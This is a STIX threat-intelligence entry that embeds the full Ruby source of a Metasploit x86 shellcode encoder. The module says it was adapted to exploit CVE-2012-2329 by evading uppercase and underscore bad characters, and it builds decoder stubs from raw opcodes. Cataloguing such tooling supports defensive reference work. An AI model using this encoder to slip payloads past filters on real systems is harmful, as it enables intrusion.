{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9380c48a-a560-4938-8c6f-1780947c607f",
    "created": "2024-08-14T16:33:19.214156Z",
    "modified": "2024-08-14T16:33:19.214159Z",
    "name": "Avoid underscore/tolower",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/avoid_underscore_tolower.rb",
            "external_id": "avoid_underscore_tolower.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n\n  # This encoder has a manual ranking because it should only be used in cases\n  # where information has been explicitly supplied, like the BufferOffset.\n  Rank = ManualRanking\n\n  # This encoder is a modified version of the sakpe's Avoid UTF8/tolower one, having\n  # into account the next set of bad chars for CVE-2012-2329 exploitation:\n  # \"\\x00\\x0d\\x0a\"\n  # \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\"\n  # \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5f\"\n  # \"\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8e\"\n  # \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9e\\x9f\"\n  def initialize\n    super(\n      'Name'             => 'Avoid underscore/tolower',\n      'Description'      => %q{\n          Underscore/tolower Safe Encoder used to exploit CVE-2012-2329. It is a\n        modified version of the 'Avoid UTF8/tolower' encoder by skape. Please check\n        the documentation of the skape encoder before using it. As the original,\n        this encoder expects ECX pointing to the start of the encoded payload. Also\n        BufferOffset must be provided if needed.\n\n        The changes introduced are (1) avoid the use of the 0x5f byte (underscore) in\n        because it is a badchar in the CVE-2012-2329 case and (2) optimize the\n        transformation block, having into account more relaxed conditions about bad\n        characters greater than 0x80.\n      },\n      'Author'           =>\n        [\n          'skape', # avoid_utf8_lower Author\n          'juan vazquez' # Adapted to be usable on CVE-2012-2329\n        ],\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'EncoderType'      => Msf::Encoder::Type::NonUpperUnderscoreSafe,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4,\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of\n  # the buffer being encoded\n  #\n  def decoder_stub(state)\n    len = ((state.buf.length + 3) & (~0x3)) / 4\n\n    # Grab the number of additional bytes that we need to adjust by in order\n    # to get the context register to point immediately after the stub header\n    off = (datastore['BufferOffset'] || 0).to_i\n\n    # Check to make sure that the length is a valid size\n    while is_badchar(state, len)\n      # Prepend \"\\x90\" nops to avoid break anything. Anyway it's going to be encoded.\n      state.buf = \"\\x90\\x90\\x90\\x90\" + state.buf\n      len = ((state.buf.length + 3) & (~0x3)) / 4\n    end\n\n    decoder =\n      \"\\x6a\" + [len].pack('C')      +  # push len\n      \"\\x6b\\x3c\\x24\\x09\"            +  # imul 0x9\n      \"\\x60\"                        +  # pusha\n      \"\\x03\\x0c\\x24\"                +  # add ecx, [esp]\n      \"\\x6a\" + [0x11+off].pack('C') +  # push byte 0x11 + off\n      \"\\x03\\x0c\\x24\"                +  # add ecx, [esp]\n      \"\\x6a\\x04\"                       # push byte 0x4\n\n    # encoded sled\n    state.context = ''\n\n    return decoder\n  end\n\n  def encode_block(state, block)\n    buf = try_add(state, block)\n\n    if (buf.nil?)\n      buf = try_sub(state, block)\n    end\n\n    if (buf.nil?)\n      raise BadcharError.new(state.encoded, 0, 0, 0)\n    end\n\n    buf\n  end\n\n  #\n  # Appends the encoded context portion.\n  #\n  def encode_end(state)\n    state.encoded += state.context\n  end\n\n  #\n  # Generate the instructions that will be used to produce a valid\n  # block after decoding using the sub instruction in conjunction with\n  # two underscore/tolower safe values.\n  #\n  def try_sub(state, block)\n    buf = \"\\x81\\x29\";\n    vbuf  = ''\n    ctx   = ''\n    carry = 0\n\n    block.each_byte { |b|\n\n      x          = 0\n      y          = 0\n      attempts   = 0\n      prev_carry = carry\n\n      begin\n        carry = prev_carry\n\n        if (b > 0x80)\n          diff  = 0x100 - b\n          y     = rand(0x80 - diff - 1).to_i + 1\n          x     = (0x100 - (b - y + carry))\n          carry = 1\n        else\n          diff  = 0x7f - b\n          x     = rand(diff - 1) + 1\n          y     = (b + x + carry) & 0xff\n          carry = 0\n        end\n\n        attempts += 1\n\n        # Lame.\n        return nil if (attempts > 512)\n\n      end while (is_badchar(state, x) or is_badchar(state, y))\n\n      vbuf += [x].pack('C')\n      ctx  += [y].pack('C')\n    }\n\n    buf += vbuf + \"\\x03\\x0c\\x24\"\n\n    state.context += ctx\n\n    return buf\n\n  end\n\n  #\n  # Generate instructions that will be used to produce a valid block after\n  # decoding using the add instruction in conjunction with two underscore/tolower\n  # safe values.\n  #\n  def try_add(state, block)\n    buf  = \"\\x81\\x01\"\n    vbuf = ''\n    ctx  = ''\n\n    block.each_byte { |b|\n\n      attempts = 0\n\n      begin\n        if b == 0x00\n          xv = rand(b - 1) # badchars will kill 0x00 if it isn't allowed\n        else\n          xv = rand(b - 1) + 1\n        end\n\n\n        attempts += 1\n\n        # Lame.\n        return nil if (attempts > 512)\n\n      end while (is_badchar(state, xv) or is_badchar(state, b - xv))\n\n      vbuf += [xv].pack('C')\n      ctx  += [b - xv].pack('C')\n    }\n\n    buf += vbuf + \"\\x03\\x0c\\x24\"\n\n    state.context += ctx\n\n    return buf\n  end\n\n  def is_badchar(state, val)\n    (val >= 0x41 and val <= 0x5a) or val == 0x5f or Rex::Text.badchar_index([val].pack('C'), state.badchars)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}